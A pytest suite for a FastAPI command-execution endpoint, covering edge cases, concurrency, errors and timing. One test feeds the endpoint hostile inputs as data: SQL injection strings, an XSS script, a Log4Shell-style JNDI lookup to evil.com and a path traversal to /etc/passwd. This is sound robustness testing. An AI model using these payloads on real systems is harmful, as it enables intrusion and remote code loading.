"""
Comprehensive tests for async command execution in the core API.

Tests cover:
- Empty/null command handling
- Command parameters passing
- Concurrent command execution
- Executor error handling
- Timeout scenarios
- State transitions during command execution
- Edge cases: very long command strings, special characters
"""

import asyncio
import time
from datetime import datetime
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from chatty_commander.web.routes.core import (
    CommandRequest,
    CommandResponse,
    include_core_routes,
)


# =============================================================================
# FIXTURES
# =============================================================================


@pytest.fixture
def mock_state_manager():
    """Create a mock state manager with trackable state transitions."""
    sm = MagicMock()
    sm.current_state = "idle"
    sm.get_active_models.return_value = ["model1", "model2"]

    # Track state changes
    state_history = []

    def track_state_change(new_state):
        state_history.append((sm.current_state, new_state))
        sm.current_state = new_state
        return True

    sm.change_state = MagicMock(side_effect=track_state_change)
    sm._state_history = state_history

    return sm


@pytest.fixture
def mock_execute_command():
    """Create a mock execute command function with tracking."""
    calls = []

    def execute(cmd: str) -> bool:
        calls.append({
            "command": cmd,
            "timestamp": time.time(),
        })
        # Simulate some commands returning False (not found)
        if cmd.startswith("unknown_"):
            return False
        if cmd == "fail_command":
            raise RuntimeError("Command execution failed!")
        return True

    mock_fn = MagicMock(side_effect=execute)
    mock_fn._calls = calls
    return mock_fn


@pytest.fixture
def router(mock_state_manager, mock_execute_command):
    """Create a router with injectable dependencies."""
    return include_core_routes(
        get_start_time=lambda: time.time(),
        get_state_manager=lambda: mock_state_manager,
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=lambda: datetime.now(),
        execute_command_fn=mock_execute_command,
    )


@pytest.fixture
def app(router):
    """Create a FastAPI app with the router."""
    app = FastAPI()
    app.include_router(router)
    return app


@pytest.fixture
def client(app):
    """Create a test client."""
    return TestClient(app)


def get_command_endpoint(router):
    """Extract the command endpoint from a router."""
    for route in router.routes:
        if route.path == "/api/v1/command" and "POST" in route.methods:
            return route.endpoint
    raise ValueError("Command endpoint not found")


# =============================================================================
# 1. EMPTY/NULL COMMAND HANDLING
# =============================================================================


@pytest.mark.asyncio
async def test_empty_command_string(router, mock_execute_command):
    """Test that an empty command string is handled gracefully."""
    endpoint = get_command_endpoint(router)

    # Create request with empty command
    request = CommandRequest(command="", parameters=None)

    # Mock asyncio.get_running_loop
    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        # Setup future result
        future = asyncio.Future()
        future.set_result(False)  # Empty command returns False (not found)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is False
        assert "no-op" in response.message.lower() or "not found" in response.message.lower()

        # Verify the empty string was passed to executor
        call_args = mock_loop.run_in_executor.call_args
        assert call_args[0][2] == ""


@pytest.mark.asyncio
async def test_whitespace_only_command(router, mock_execute_command):
    """Test that whitespace-only commands are handled correctly."""
    endpoint = get_command_endpoint(router)

    request = CommandRequest(command="   \t\n   ", parameters=None)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(False)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is False
        # Verify whitespace was passed as-is (no trimming by default)
        call_args = mock_loop.run_in_executor.call_args
        assert call_args[0][2] == "   \t\n   "


@pytest.mark.asyncio
async def test_none_command_raises_validation_error(app):
    """Test that None command raises a validation error (not allowed by model)."""
    client = TestClient(app)

    # The Pydantic model requires command to be a string
    response = client.post("/api/v1/command", json={"command": None})
    assert response.status_code == 422  # Validation error


@pytest.mark.asyncio
async def test_missing_command_field_raises_validation_error(app):
    """Test that missing command field raises a validation error."""
    client = TestClient(app)

    response = client.post("/api/v1/command", json={"parameters": {"key": "value"}})
    assert response.status_code == 422  # Validation error


# =============================================================================
# 2. COMMAND PARAMETERS PASSING
# =============================================================================


@pytest.mark.asyncio
async def test_parameters_accepted_in_request(router):
    """Test that parameters are accepted in the request model."""
    endpoint = get_command_endpoint(router)

    # Create request with parameters
    params = {
        "arg1": "value1",
        "arg2": 123,
        "nested": {"key": "value"},
        "list": [1, 2, 3],
    }
    request = CommandRequest(command="test_cmd", parameters=params)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is True
        assert response.execution_time >= 0


@pytest.mark.asyncio
async def test_parameters_none_default(router):
    """Test that None is the default for parameters."""
    endpoint = get_command_endpoint(router)

    request = CommandRequest(command="test_cmd")

    # Parameters should be None by default
    assert request.parameters is None

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)
        assert response.success is True


@pytest.mark.asyncio
async def test_empty_parameters_dict(router):
    """Test that empty dict parameters are handled correctly."""
    endpoint = get_command_endpoint(router)

    request = CommandRequest(command="test_cmd", parameters={})

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is True
        assert request.parameters == {}


@pytest.mark.asyncio
async def test_complex_parameters_structure(router):
    """Test that complex nested parameters are accepted."""
    endpoint = get_command_endpoint(router)

    complex_params = {
        "config": {
            "nested": {
                "deeply": {
                    "value": "test",
                    "numbers": [1, 2, 3],
                    "mixed": ["a", 1, True, None],
                }
            }
        },
        "flags": {"enabled": True, "verbose": False},
        "unicode": "Hello 你好的世界 🌍",
        "special_chars": "path/to/file.txt?key=value&other=123",
    }
    request = CommandRequest(command="complex_cmd", parameters=complex_params)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is True


# =============================================================================
# 3. CONCURRENT COMMAND EXECUTION
# =============================================================================


@pytest.mark.asyncio
async def test_concurrent_commands_are_executed(router, mock_execute_command):
    """Test that multiple concurrent commands can be processed."""
    endpoint = get_command_endpoint(router)

    call_count = 0
    call_lock = asyncio.Lock()

    async def mock_executor(*args, **kwargs):
        nonlocal call_count
        async with call_lock:
            call_count += 1
        await asyncio.sleep(0.01)  # Small delay to simulate work
        return True

    with patch("asyncio.get_running_loop") as mock_get_loop:
        # Create a mock loop that actually executes concurrently
        mock_loop = MagicMock()

        async def run_in_executor_impl(executor, func, cmd):
            # Run in a separate coroutine (simulating thread pool)
            return await asyncio.to_thread(func, cmd)

        mock_loop.run_in_executor = MagicMock(side_effect=run_in_executor_impl)
        mock_get_loop.return_value = mock_loop

        # Execute multiple commands concurrently
        tasks = []
        for i in range(5):
            request = CommandRequest(command=f"concurrent_cmd_{i}")
            tasks.append(endpoint(request))

        results = await asyncio.gather(*tasks)

        # All should succeed
        assert all(r.success for r in results)
        assert len(results) == 5


@pytest.mark.asyncio
async def test_commands_execute_independent_of_each_other(router):
    """Test that command execution is independent - one failure doesn't affect others."""
    endpoint = get_command_endpoint(router)

    results_queue = []

    async def mock_executor(executor, func, cmd):
        await asyncio.sleep(0.01)
        if "fail" in cmd:
            raise RuntimeError("Simulated failure")
        return True

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()

        async def run_executor(executor, func, cmd):
            try:
                result = await mock_executor(executor, func, cmd)
                results_queue.append((cmd, "success", result))
                return result
            except Exception as e:
                results_queue.append((cmd, "error", str(e)))
                raise

        mock_loop.run_in_executor = MagicMock(side_effect=run_executor)
        mock_get_loop.return_value = mock_loop

        # Execute mix of failing and succeeding commands
        requests = [
            CommandRequest(command="good_cmd_1"),
            CommandRequest(command="fail_cmd"),
            CommandRequest(command="good_cmd_2"),
        ]

        results = await asyncio.gather(
            *[endpoint(req) for req in requests], return_exceptions=True
        )

        # First and third should succeed
        assert results[0].success is True
        # Second should have error message
        assert "failed" in results[1].message.lower()
        assert results[2].success is True


@pytest.mark.asyncio
async def test_high_volume_concurrent_commands(router):
    """Test system handles many concurrent commands without degradation."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()

        call_times = []

        async def run_executor(executor, func, cmd):
            start = time.time()
            await asyncio.sleep(0.001)  # Minimal delay
            call_times.append(time.time() - start)
            return True

        mock_loop.run_in_executor = MagicMock(side_effect=run_executor)
        mock_get_loop.return_value = mock_loop

        # Execute 50 commands concurrently
        num_commands = 50
        tasks = [
            endpoint(CommandRequest(command=f"bulk_cmd_{i}"))
            for i in range(num_commands)
        ]

        start_time = time.time()
        results = await asyncio.gather(*tasks)
        total_time = time.time() - start_time

        assert all(r.success for r in results)
        assert len(results) == num_commands
        # Should complete in reasonable time (< 1 second for 50 commands with 1ms delay each)
        assert total_time < 1.0, f"Too slow: {total_time:.3f}s for {num_commands} commands"


# =============================================================================
# 4. EXECUTOR ERROR HANDLING
# =============================================================================


@pytest.mark.asyncio
async def test_executor_exception_returns_error_response(router):
    """Test that exceptions in executor are caught and returned as error responses."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        # Create a future that raises an exception
        future = asyncio.Future()
        future.set_exception(RuntimeError("Executor thread crashed!"))
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="crash_cmd")
        response = await endpoint(request)

        assert response.success is False
        assert "failed" in response.message.lower()
        assert "executor thread crashed" in response.message.lower()
        assert response.execution_time >= 0


@pytest.mark.asyncio
async def test_executor_timeout_handled(router):
    """Test that executor timeout is handled gracefully."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        # Create a future that simulates a timeout
        async def slow_executor(*args, **kwargs):
            raise asyncio.TimeoutError("Operation timed out")

        mock_loop.run_in_executor = MagicMock(side_effect=slow_executor)

        request = CommandRequest(command="slow_cmd")
        response = await endpoint(request)

        assert response.success is False
        assert "failed" in response.message.lower()


@pytest.mark.asyncio
async def test_executor_returns_exception_object():
    """Test handling when executor returns an exception object (edge case)."""
    mock_execute_command = MagicMock()

    router = include_core_routes(
        get_start_time=lambda: time.time(),
        get_state_manager=lambda: MagicMock(),
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=lambda: datetime.now(),
        execute_command_fn=mock_execute_command,
    )

    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        # Return an exception object (weird edge case)
        future = asyncio.Future()
        future.set_result(ValueError("Something went wrong"))
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="weird_cmd")
        response = await endpoint(request)

        # Exception object is truthy, so bool(exception) is True
        # This tests the current behavior
        assert isinstance(response, CommandResponse)


@pytest.mark.asyncio
async def test_executor_none_result(router):
    """Test handling when executor returns None."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(None)
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="none_result_cmd")
        response = await endpoint(request)

        # bool(None) is False
        assert response.success is False
        assert "no-op" in response.message.lower() or "not found" in response.message.lower()


@pytest.mark.asyncio
async def test_executor_zero_result(router):
    """Test handling when executor returns 0 (falsy but valid result)."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(0)  # Falsy value
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="zero_result_cmd")
        response = await endpoint(request)

        assert response.success is False  # bool(0) is False


@pytest.mark.asyncio
async def test_executor_empty_string_result(router):
    """Test handling when executor returns empty string."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result("")  # Empty string
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="empty_result_cmd")
        response = await endpoint(request)

        assert response.success is False  # bool("") is False


# =============================================================================
# 5. TIMEOUT SCENARIOS
# =============================================================================


@pytest.mark.asyncio
async def test_command_execution_time_measured(router):
    """Test that execution time is accurately measured."""
    endpoint = get_command_endpoint(router)

    execution_delay = 0.05  # 50ms

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        async def delayed_executor(*args, **kwargs):
            await asyncio.sleep(execution_delay)
            return True

        mock_loop.run_in_executor = MagicMock(side_effect=delayed_executor)

        request = CommandRequest(command="timed_cmd")
        response = await endpoint(request)

        # Execution time should be at least as long as our delay
        # (Allowing for some variance)
        assert response.execution_time >= execution_delay * 1000 * 0.9  # 90% accuracy
        assert response.execution_time < execution_delay * 1000 * 5  # But not too long


@pytest.mark.asyncio
async def test_fast_execution_time(router):
    """Test execution time measurement for very fast commands."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)  # Instant result
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="fast_cmd")
        response = await endpoint(request)

        # Even fast commands should have measurable time (at least 0)
        assert response.execution_time >= 0
        assert response.execution_time < 1000  # Should be much faster than 1 second


@pytest.mark.asyncio
async def test_executor_hangs_timeout(router):
    """Test handling of executor that hangs (simulated timeout)."""
    endpoint = get_command_endpoint(router)

    hang_duration = 0.1  # 100ms hang

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        async def hanging_executor(*args, **kwargs):
            # Simulate hanging - in real scenario this would timeout
            await asyncio.sleep(hang_duration)
            return True

        mock_loop.run_in_executor = MagicMock(side_effect=hanging_executor)

        start_time = time.time()
        request = CommandRequest(command="hang_cmd")
        response = await endpoint(request)
        elapsed = time.time() - start_time

        # Command should eventually complete
        assert response.success is True
        # Should not hang indefinitely
        assert elapsed < 1.0


# =============================================================================
# 6. STATE TRANSITIONS DURING COMMAND EXECUTION
# =============================================================================


@pytest.mark.asyncio
async def test_state_checked_before_command(mock_state_manager):
    """Test that state manager is available during command execution."""
    mock_execute_command = MagicMock(return_value=True)

    router = include_core_routes(
        get_start_time=lambda: time.time(),
        get_state_manager=lambda: mock_state_manager,
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=lambda: datetime.now(),
        execute_command_fn=mock_execute_command,
    )

    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="state_test_cmd")
        response = await endpoint(request)

        assert response.success is True
        # State manager should still be accessible
        assert mock_state_manager.current_state == "idle"


@pytest.mark.asyncio
async def test_state_after_command_success(mock_state_manager):
    """Test state integrity after successful command execution."""
    mock_execute_command = MagicMock(return_value=True)

    router = include_core_routes(
        get_start_time=lambda: time.time(),
        get_state_manager=lambda: mock_state_manager,
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=lambda: datetime.now(),
        execute_command_fn=mock_execute_command,
    )

    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        initial_state = mock_state_manager.current_state

        request = CommandRequest(command="state_cmd")
        response = await endpoint(request)

        assert response.success is True
        # State should remain unchanged (command doesn't change state directly)
        assert mock_state_manager.current_state == initial_state


@pytest.mark.asyncio
async def test_state_preserved_on_command_failure(mock_state_manager):
    """Test that state is preserved when command fails."""
    mock_execute_command = MagicMock(side_effect=RuntimeError("Command failed"))

    router = include_core_routes(
        get_start_time=lambda: time.time(),
        get_state_manager=lambda: mock_state_manager,
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=lambda: datetime.now(),
        execute_command_fn=mock_execute_command,
    )

    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_exception(RuntimeError("Command failed"))
        mock_loop.run_in_executor.return_value = future

        initial_state = mock_state_manager.current_state

        request = CommandRequest(command="fail_state_cmd")
        response = await endpoint(request)

        assert response.success is False
        # State should be unchanged after failure
        assert mock_state_manager.current_state == initial_state


# =============================================================================
# 7. EDGE CASES: LONG COMMANDS AND SPECIAL CHARACTERS
# =============================================================================


@pytest.mark.asyncio
async def test_very_long_command_string(router):
    """Test handling of very long command strings."""
    endpoint = get_command_endpoint(router)

    # Create a command string with 10,000 characters
    long_cmd = "a" * 10000
    request = CommandRequest(command=long_cmd)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is True
        # Verify the full long string was passed to executor
        call_args = mock_loop.run_in_executor.call_args
        assert call_args[0][2] == long_cmd


@pytest.mark.asyncio
async def test_unicode_command(router):
    """Test Unicode characters in command string."""
    endpoint = get_command_endpoint(router)

    unicode_cmds = [
        "你好世界",  # Chinese
        "Привет мир",  # Russian
        "مرحبا بالعالم",  # Arabic
        "こんにちは世界",  # Japanese
        "🎉🎊🎁",  # Emoji
        "mix_混合_🎉_test",  # Mixed
    ]

    for cmd in unicode_cmds:
        request = CommandRequest(command=cmd)

        with patch("asyncio.get_running_loop") as mock_get_loop:
            mock_loop = MagicMock()
            mock_get_loop.return_value = mock_loop

            future = asyncio.Future()
            future.set_result(True)
            mock_loop.run_in_executor.return_value = future

            response = await endpoint(request)

            assert response.success is True
            # Verify Unicode preserved
            call_args = mock_loop.run_in_executor.call_args
            assert call_args[0][2] == cmd


@pytest.mark.asyncio
async def test_special_characters_command(router):
    """Test special characters in command string."""
    endpoint = get_command_endpoint(router)

    special_cmds = [
        "cmd_with_!@#$%^&*()",
        "cmd+with+plus+signs",
        "cmd=with=equals",
        "cmd?query=value&other=123",
        "cmd/with/slashes\\and\\backslashes",
        "cmd'with\"quotes",
        "cmd`with`backticks",
        "cmd{with}[brackets]",
        "cmd|pipe<symbols>",
        "cmd\nwith\nnewlines",
        "cmd\twith\ttabs",
        "cmd with spaces",
    ]

    for cmd in special_cmds:
        request = CommandRequest(command=cmd)

        with patch("asyncio.get_running_loop") as mock_get_loop:
            mock_loop = MagicMock()
            mock_get_loop.return_value = mock_loop

            future = asyncio.Future()
            future.set_result(True)
            mock_loop.run_in_executor.return_value = future

            response = await endpoint(request)

            assert response.success is True


@pytest.mark.asyncio
async def test_null_byte_in_command(router):
    """Test handling of null byte in command (potential security concern)."""
    endpoint = get_command_endpoint(router)

    # Null byte in command
    cmd_with_null = "cmd\x00injection"
    request = CommandRequest(command=cmd_with_null)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        # Should handle without crashing
        assert response.success is True


@pytest.mark.asyncio
async def test_sql_like_injection_patterns(router):
    """Test SQL-like injection patterns are passed through (handled by executor)."""
    endpoint = get_command_endpoint(router)

    injection_patterns = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "UNION SELECT * FROM users",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "../../../etc/passwd",
    ]

    for pattern in injection_patterns:
        request = CommandRequest(command=pattern)

        with patch("asyncio.get_running_loop") as mock_get_loop:
            mock_loop = MagicMock()
            mock_get_loop.return_value = mock_loop

            future = asyncio.Future()
            future.set_result(True)  # Executor handles security
            mock_loop.run_in_executor.return_value = future

            response = await endpoint(request)

            # Endpoint should not crash, executor handles security
            assert response.success is True


@pytest.mark.asyncio
async def test_very_long_parameters(router):
    """Test handling of very long parameter values."""
    endpoint = get_command_endpoint(router)

    # Create parameters with very long values
    large_params = {
        "large_string": "x" * 100000,  # 100KB string
        "large_list": list(range(10000)),
        "deeply_nested": _create_nested_dict(100),  # 100 levels deep
    }
    request = CommandRequest(command="large_params_cmd", parameters=large_params)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        response = await endpoint(request)

        assert response.success is True


def _create_nested_dict(depth: int) -> dict:
    """Create a deeply nested dictionary for testing."""
    result = {"value": "deepest"}
    for _ in range(depth):
        result = {"nested": result}
    return result


# =============================================================================
# ADDITIONAL INTEGRATION TESTS
# =============================================================================


def test_command_endpoint_via_test_client(client):
    """Test command endpoint through full HTTP stack."""
    response = client.post(
        "/api/v1/command",
        json={"command": "test_via_client", "parameters": {"key": "value"}},
    )

    assert response.status_code == 200
    data = response.json()
    assert "success" in data
    assert "message" in data
    assert "execution_time" in data


def test_command_response_structure(client):
    """Test that response matches expected CommandResponse model."""
    response = client.post("/api/v1/command", json={"command": "structure_test"})

    assert response.status_code == 200
    data = response.json()

    # Verify all required fields present
    assert isinstance(data["success"], bool)
    assert isinstance(data["message"], str)
    assert isinstance(data["execution_time"], (int, float))
    assert data["execution_time"] >= 0


def test_command_increments_counter(client):
    """Test that command execution increments the metrics counter."""
    # Get initial counter
    metrics_before = client.get("/api/v1/metrics").json()
    command_count_before = metrics_before.get("command_post", 0)

    # Execute a command
    client.post("/api/v1/command", json={"command": "counter_test"})

    # Check counter incremented
    metrics_after = client.get("/api/v1/metrics").json()
    command_count_after = metrics_after.get("command_post", 0)

    assert command_count_after > command_count_before


@pytest.mark.asyncio
async def test_executor_passed_correct_arguments(router):
    """Test that executor receives correct command name."""
    endpoint = get_command_endpoint(router)

    test_command = "verify_args_cmd"

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command=test_command)
        await endpoint(request)

        # Verify executor was called with correct arguments
        mock_loop.run_in_executor.assert_called_once()
        call_args = mock_loop.run_in_executor.call_args

        # First positional arg (after side_effect unpacking) is executor (None)
        assert call_args[0][0] is None
        # Second is the function (execute_command_fn)
        assert callable(call_args[0][1])
        # Third is the command string
        assert call_args[0][2] == test_command


@pytest.mark.asyncio
async def test_default_executor_used(router):
    """Test that default executor (None) is used for thread pool."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        request = CommandRequest(command="executor_test")
        await endpoint(request)

        # First argument to run_in_executor should be None (default executor)
        call_args = mock_loop.run_in_executor.call_args
        assert call_args[0][0] is None, "Should use default thread pool executor"


# =============================================================================
# PERFORMANCE AND STRESS TESTS
# =============================================================================


@pytest.mark.asyncio
async def test_rapid_sequential_commands(router):
    """Test handling of rapid sequential command requests."""
    endpoint = get_command_endpoint(router)

    num_commands = 100

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        future = asyncio.Future()
        future.set_result(True)
        mock_loop.run_in_executor.return_value = future

        results = []
        for i in range(num_commands):
            request = CommandRequest(command=f"rapid_cmd_{i}")
            response = await endpoint(request)
            results.append(response)

        assert len(results) == num_commands
        assert all(r.success for r in results)


@pytest.mark.asyncio
async def test_memory_efficiency_many_commands(router):
    """Test memory efficiency with many command executions."""
    endpoint = get_command_endpoint(router)

    with patch("asyncio.get_running_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_get_loop.return_value = mock_loop

        # Track memory (simplified check - just ensure no crash)
        for i in range(500):
            future = asyncio.Future()
            future.set_result(True)
            mock_loop.run_in_executor.return_value = future

            request = CommandRequest(command=f"memory_test_{i}")
            response = await endpoint(request)

            assert isinstance(response, CommandResponse)


@pytest.mark.asyncio
async def test_command_response_immutability():
    """Test that CommandResponse is properly structured and immutable in usage."""
    response = CommandResponse(
        success=True, message="Test message", execution_time=123.45
    )

    assert response.success is True
    assert response.message == "Test message"
    assert response.execution_time == 123.45

    # Pydantic models are immutable by default with frozen=True
    # Or at least properly typed - verify structure
    assert hasattr(response, "model_dump")

    # Can be serialized
    data = response.model_dump()
    assert data["success"] is True
    assert data["message"] == "Test message"
    assert data["execution_time"] == 123.45
